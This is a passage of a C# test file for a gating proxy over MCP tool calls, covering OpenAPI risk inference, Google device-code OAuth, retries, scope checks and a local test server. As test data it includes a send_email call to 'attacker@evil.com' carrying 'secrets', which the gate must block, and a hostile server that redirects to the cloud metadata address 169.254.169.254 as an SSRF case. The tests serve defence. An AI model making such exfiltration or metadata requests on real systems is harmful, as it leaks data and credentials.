        var get = Assert.Single(schemas, s => s.Name == "get_invoice");
        Assert.Equal("GET", get.Method);
        // Field came from the PATH-level parameters block (shared across methods).
        Assert.Contains("id", get.Parameters);
    }

    /// <summary>
    /// Semantic inference: a "charge/invoice" operation maps to financial-write (high risk),
    /// billing capability, and requires confirmation — derived from keywords, not just the method.
    /// </summary>
    [Fact]
    public void OpenApiImporter_infers_financial_side_effect_and_capability()
    {
        var schemas = OpenApiImporter.ParseFromOpenApi(YamlSpec);
        var contract = OpenApiImporter.ToContract(schemas.Single(s => s.Name == "create_invoice"));

        Assert.Equal("act-create-invoice", contract.Kind);
        Assert.Equal("financial-write", contract.SideEffect);
        Assert.Equal("high", contract.Risk);
        Assert.Equal("billing", contract.Capability);
        Assert.True(contract.RequiresConfirmation);
    }

    /// <summary>An "email/send" operation infers email-send + the email capability.</summary>
    [Fact]
    public void OpenApiImporter_infers_email_capability_from_keywords()
    {
        var schema = new ToolSchema("send_welcome", "POST", "Send a welcome email to the new user",
            new[] { "to", "subject" });
        var contract = OpenApiImporter.ToContract(schema);

        Assert.Equal("email-send", contract.SideEffect);
        Assert.Equal("email", contract.Capability);
        Assert.True(contract.RequiresConfirmation);
    }

    /// <summary>A "remove/delete" operation infers a destructive side effect and high risk.</summary>
    [Fact]
    public void OpenApiImporter_infers_delete_side_effect_high_risk()
    {
        var schema = new ToolSchema("remove_user", "DELETE", "Permanently remove a user account",
            new[] { "id" });
        var contract = OpenApiImporter.ToContract(schema);

        Assert.Equal("delete", contract.SideEffect);
        Assert.Equal("high", contract.Risk);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (f) Gmail OAuth — the real device-authorization flow (scripted HTTP)
    // ═══════════════════════════════════════════════════════════════════════════

    private const string DeviceJson =
        """{"device_code":"DEV-123","user_code":"WXYZ-1234","verification_uri":"https://www.google.com/device","interval":5,"expires_in":1800}""";
    private const string PendingJson = """{"error":"authorization_pending"}""";
    private const string SlowDownJson = """{"error":"slow_down"}""";
    private const string SuccessJson = """{"access_token":"ya29.real-token","expires_in":3599,"token_type":"Bearer"}""";

    /// <summary>
    /// The device flow polls through an authorization_pending response and then returns the real
    /// access token on consent. The prompt surfaces the verification URL + user code.
    /// </summary>
    [Fact]
    public async Task GoogleDeviceCodeFlow_polls_pending_then_returns_token()
    {
        var handler = new ScriptedOAuthHandler(
            device: (200, DeviceJson),
            tokens: new[] { (400, PendingJson), (200, SuccessJson) });
        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));

        DeviceCodeResponse? shown = null;
        var token = await flow.AuthorizeAsync("client-id", "client-secret", GoogleDeviceCodeFlow.DefaultScope,
            prompt: d => shown = d,
            delay: _ => Task.CompletedTask);

        Assert.Equal("ya29.real-token", token.AccessToken);
        Assert.True(token.ExpiresAt > DateTimeOffset.UtcNow);
        Assert.Equal(2, handler.TokenCalls);                 // pending, then success
        Assert.NotNull(shown);
        Assert.Equal("WXYZ-1234", shown!.UserCode);
        Assert.Contains("google.com/device", shown.VerificationUrl);
    }

    /// <summary>A slow_down response backs off and the flow still completes successfully.</summary>
    [Fact]
    public async Task GoogleDeviceCodeFlow_handles_slow_down()
    {
        var handler = new ScriptedOAuthHandler(
            device: (200, DeviceJson),
            tokens: new[] { (400, SlowDownJson), (200, SuccessJson) });
        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));

        var token = await flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope,
            delay: _ => Task.CompletedTask);

        Assert.Equal("ya29.real-token", token.AccessToken);
        Assert.Equal(2, handler.TokenCalls);
    }

    /// <summary>A terminal error (access_denied) surfaces as a clear exception.</summary>
    [Fact]
    public void GoogleDeviceCodeFlow_throws_on_access_denied()
    {
        var handler = new ScriptedOAuthHandler(
            device: (200, DeviceJson),
            tokens: new[] { (400, """{"error":"access_denied"}""") });
        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));

        var ex = Assert.Throws<InvalidOperationException>(() =>
            flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope,
                delay: _ => Task.CompletedTask).GetAwaiter().GetResult());
        Assert.Contains("access_denied", ex.Message);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (g) Hardening — transient retry/backoff, OAuth token-scope, progress
    // ═══════════════════════════════════════════════════════════════════════════

    /// <summary>RetryingMcpClient retries a TRANSIENT transport failure on the READ-ONLY ListTools with
    /// (zero-wait, injected) backoff and succeeds — a flaky network blip doesn't surface to the caller.</summary>
    [Fact]
    public void RetryingMcpClient_retries_a_transient_failure_then_succeeds()
    {
        int calls = 0;
        var inner = new FakeMcpClient(() =>
        {
            calls++;
            if (calls < 3) throw new IOException("connection reset");
            return "ok";
        });
        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask);

        Assert.NotNull(retrying.ListTools());
        Assert.Equal(3, calls);   // two transient failures, third succeeds
    }

    /// <summary>CallTool is NOT retried by default — a transient failure after the server may have
    /// already performed a non-idempotent side effect must not re-issue it (duplicate send/write/delete).</summary>
    [Fact]
    public void RetryingMcpClient_does_not_retry_CallTool_by_default()
    {
        int calls = 0;
        var inner = new FakeMcpClient(() => { calls++; throw new IOException("reset after the send went out"); });
        var retrying = new RetryingMcpClient(inner, maxAttempts: 5, delay: _ => Task.CompletedTask);

        Assert.Throws<IOException>(() => retrying.CallTool("send_email", new Dictionary<string, string>()));
        Assert.Equal(1, calls);   // single attempt — no duplicate side effect
    }

    /// <summary>CallTool IS retried when the caller opts in (idempotent tools only).</summary>
    [Fact]
    public void RetryingMcpClient_retries_CallTool_when_opted_in()
    {
        int calls = 0;
        var inner = new FakeMcpClient(() => { calls++; if (calls < 2) throw new IOException("blip"); return "ok"; });
        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask, retryToolCalls: true);

        Assert.Equal("ok", retrying.CallTool("read_file", new Dictionary<string, string>()));
        Assert.Equal(2, calls);
    }

    /// <summary>A FATAL error (an MCP protocol error / blocked call surfaces as
    /// InvalidOperationException) is NOT retried — it propagates on the first attempt.</summary>
    [Fact]
    public void RetryingMcpClient_does_not_retry_a_fatal_error()
    {
        int calls = 0;
        var inner = new FakeMcpClient(() => { calls++; throw new InvalidOperationException("MCP error: tool denied"); });
        var retrying = new RetryingMcpClient(inner, maxAttempts: 5, delay: _ => Task.CompletedTask);

        Assert.Throws<InvalidOperationException>(() => retrying.ListTools());
        Assert.Equal(1, calls);   // fatal → no retry
    }

    /// <summary>A persistently transient error exhausts the attempts and then throws the last one.</summary>
    [Fact]
    public void RetryingMcpClient_gives_up_after_max_attempts()
    {
        int calls = 0;
        var inner = new FakeMcpClient(() => { calls++; throw new HttpRequestException("down"); });
        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask);

        Assert.Throws<HttpRequestException>(() => retrying.ListTools());
        Assert.Equal(3, calls);
    }

    private const string NarrowScopeJson =
        """{"access_token":"ya29.narrow","expires_in":3599,"scope":"https://www.googleapis.com/auth/gmail.readonly"}""";
    private const string WideScopeJson =
        """{"access_token":"ya29.wide","expires_in":3599,"scope":"https://www.googleapis.com/auth/gmail.send https://www.googleapis.com/auth/gmail.metadata"}""";

    /// <summary>Token-scope enforcement: if the server grants a scope NARROWER than requested, the
    /// flow refuses the token (fail-closed) rather than hand the adapter a token it can't use.</summary>
    [Fact]
    public void GoogleDeviceCodeFlow_rejects_a_downgraded_scope()
    {
        var handler = new ScriptedOAuthHandler(device: (200, DeviceJson), tokens: new[] { (200, NarrowScopeJson) });
        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));

        var ex = Assert.Throws<InvalidOperationException>(() =>
            flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope, delay: _ => Task.CompletedTask).GetAwaiter().GetResult());
        Assert.Contains("narrower scope", ex.Message, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("gmail.send", ex.Message);
    }

    /// <summary>A grant that COVERS the requested scope (even if it also includes extra scopes) is
    /// accepted, and the granted scope is recorded on the token.</summary>
    [Fact]
    public async Task GoogleDeviceCodeFlow_accepts_a_covering_scope()
    {
        var handler = new ScriptedOAuthHandler(device: (200, DeviceJson), tokens: new[] { (200, WideScopeJson) });
        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));

        var token = await flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope, delay: _ => Task.CompletedTask);
        Assert.Equal("ya29.wide", token.AccessToken);
        Assert.Contains("gmail.send", token.Scope);
    }

    /// <summary>MissingScopes is the coverage primitive: it reports exactly the requested scopes
    /// absent from the grant (order-insensitive, extras ignored).</summary>
    [Fact]
    public void MissingScopes_reports_only_uncovered_requested_scopes()
    {
        Assert.Empty(GoogleDeviceCodeFlow.MissingScopes("a b", "b a c"));
        Assert.Equal(new[] { "a" }, GoogleDeviceCodeFlow.MissingScopes("a b", "b c"));
    }

    /// <summary>GateAndForward narrates progress: a blocked call reports the gate decision and that it
    /// was not forwarded — and the transport is never touched.</summary>
    [Fact]
    public void GateAndForward_reports_progress_and_does_not_forward_when_blocked()
    {
        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);
        var events = new List<string>();
        var forwarded = false;
        var client = new FakeMcpClient(() => { forwarded = true; return "{}"; });

        var fwd = proxy.GateAndForward(
            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }),
            client, approvals: null, progress: new SyncProgress(events.Add));

        Assert.False(fwd.Gate.Allowed);
        Assert.Null(fwd.ServerResponse);
        Assert.False(forwarded, "a blocked call must never reach the transport");
        Assert.Contains(events, e => e.Contains("gate: blocked", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(events, e => e.Contains("not forwarded", StringComparison.OrdinalIgnoreCase));
    }

    // ── Test doubles ────────────────────────────────────────────────────────────

    /// <summary>A minimal IMcpClient whose every tool/list call runs an injected delegate — used to
    /// drive the retry loop and the progress/forward path deterministically with no real transport.</summary>
    private sealed class FakeMcpClient : IMcpClient
    {
        private readonly Func<string> _behavior;
        public FakeMcpClient(Func<string> behavior) => _behavior = behavior;
        public IReadOnlyList<string> ListTools() { _behavior(); return Array.Empty<string>(); }
        public string CallTool(string name, IReadOnlyDictionary<string, string> arguments) => _behavior();
        public void Dispose() { }
    }

    /// <summary>A synchronous IProgress so reports are observable in-line (the BCL Progress&lt;T&gt;
    /// posts asynchronously, which is non-deterministic in a test).</summary>
    private sealed class SyncProgress : IProgress<string>
    {
        private readonly Action<string> _on;
        public SyncProgress(Action<string> on) => _on = on;
        public void Report(string value) => _on(value);
    }

    /// <summary>An HttpMessageHandler that scripts Google's device-code + token responses so the
    /// device-flow state machine is tested without real network or real waiting.</summary>
    private sealed class ScriptedOAuthHandler : HttpMessageHandler
    {
        private readonly (int status, string json) _device;
        private readonly Queue<(int status, string json)> _tokens;
        public int TokenCalls { get; private set; }

        public ScriptedOAuthHandler((int status, string json) device, (int status, string json)[] tokens)
        {
            _device = device;
            _tokens = new Queue<(int, string)>(tokens);
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
        {
            var (status, json) = request.RequestUri!.AbsoluteUri.Contains("device/code")
                ? _device
                : Next();
            return Task.FromResult(new HttpResponseMessage((HttpStatusCode)status)
            {
                Content = new StringContent(json, Encoding.UTF8, "application/json")
            });
        }

        private (int, string) Next() { TokenCalls++; return _tokens.Dequeue(); }
    }

    /// <summary>A minimal in-process MCP server over Streamable HTTP (HttpListener). Answers
    /// initialize / tools/list / tools/call as either application/json or text/event-stream, so the
    /// real McpHttpClient transport is exercised end-to-end without an external server.</summary>
    private sealed class McpHttpTestServer : IDisposable
    {
        private readonly HttpListener _listener;
        private readonly bool _useSse;
        private readonly bool _errorOnCall;
        private readonly bool _redirectOnCall;
        public string Url { get; }

        private McpHttpTestServer(HttpListener listener, string url, bool useSse, bool errorOnCall, bool redirectOnCall)
        {
            _listener = listener;
            Url = url;
            _useSse = useSse;
            _errorOnCall = errorOnCall;
            _redirectOnCall = redirectOnCall;
            _ = Task.Run(Loop);
        }

        public static McpHttpTestServer? Start(bool useSse, bool errorOnCall = false, bool redirectOnCall = false)
        {
            int port = FreePort();
            var url = $"http://localhost:{port}/mcp/";
            var listener = new HttpListener();
            listener.Prefixes.Add(url);
            try { listener.Start(); }
            catch { return null; }   // environment forbids HttpListener — skip the test
            return new McpHttpTestServer(listener, url, useSse, errorOnCall, redirectOnCall);
        }

        private static int FreePort()
        {
            var l = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
            l.Start();
            int port = ((System.Net.IPEndPoint)l.LocalEndpoint).Port;
            l.Stop();
            return port;
        }

        private void Loop()
        {
            while (_listener.IsListening)
            {
                HttpListenerContext ctx;
                try { ctx = _listener.GetContext(); }
                catch { return; }   // listener stopped
                try { Handle(ctx); } catch { /* best effort */ }
            }
        }

        private void Handle(HttpListenerContext ctx)
        {
            using var reader = new StreamReader(ctx.Request.InputStream, Encoding.UTF8);
            var body = reader.ReadToEnd();
            using var doc = JsonDocument.Parse(body);
            var root = doc.RootElement;
            var method = root.GetProperty("method").GetString();

            // Notifications carry no id → 202 Accepted, no body.
            if (!root.TryGetProperty("id", out var idEl))
            {
                ctx.Response.StatusCode = 202;
                ctx.Response.OutputStream.Close();
                return;
            }

            int id = idEl.GetInt32();

            // Simulate a hostile endpoint that 307-redirects tools/call to the cloud-metadata address.
            // A guarded client must NOT follow it (SSRF) — the redirect surfaces as a non-success status.
            if (_redirectOnCall && method == "tools/call")
            {
                ctx.Response.StatusCode = 307;
                ctx.Response.Headers["Location"] = "http://169.254.169.254/latest/meta-data/";
                ctx.Response.OutputStream.Close();
                return;
            }

            // Simulate a hostile endpoint that streams a large error body on tools/call.
            if (_errorOnCall && method == "tools/call")
            {
                ctx.Response.StatusCode = 400;
                ctx.Response.ContentType = "application/json";
                var big = Encoding.UTF8.GetBytes(new string('x', 5000));
                ctx.Response.ContentLength64 = big.Length;
                ctx.Response.OutputStream.Write(big, 0, big.Length);
                ctx.Response.OutputStream.Close();
                return;
            }

            object result = method switch
            {
                "initialize" => new { protocolVersion = McpHttpClient.ProtocolVersion, serverInfo = new { name = "test", version = "1.0" }, capabilities = new { } },
                "tools/list" => new { tools = new[] { new { name = "read_calendar" }, new { name = "send_email" } } },
                "tools/call" => new { content = new[] { new { type = "text", text = $"{root.GetProperty("params").GetProperty("name").GetString()} executed via http" } } },
                _ => new { },
            };
            var payload = JsonSerializer.Serialize(new { jsonrpc = "2.0", id, result });

            if (method == "initialize")
                ctx.Response.Headers["Mcp-Session-Id"] = "test-session";

            // tools/call uses SSE when configured; everything else stays plain JSON.
            if (_useSse && method == "tools/call")
            {
                ctx.Response.ContentType = "text/event-stream";
                var bytes = Encoding.UTF8.GetBytes($"event: message\ndata: {payload}\n\n");
                ctx.Response.OutputStream.Write(bytes, 0, bytes.Length);
            }
            else
            {
                ctx.Response.ContentType = "application/json";
                var bytes = Encoding.UTF8.GetBytes(payload);
                ctx.Response.ContentLength64 = bytes.Length;
                ctx.Response.OutputStream.Write(bytes, 0, bytes.Length);
            }
            ctx.Response.OutputStream.Close();
        }

        public void Dispose()
        {
            try { _listener.Stop(); _listener.Close(); } catch { /* best effort */ }
        }
    }
}
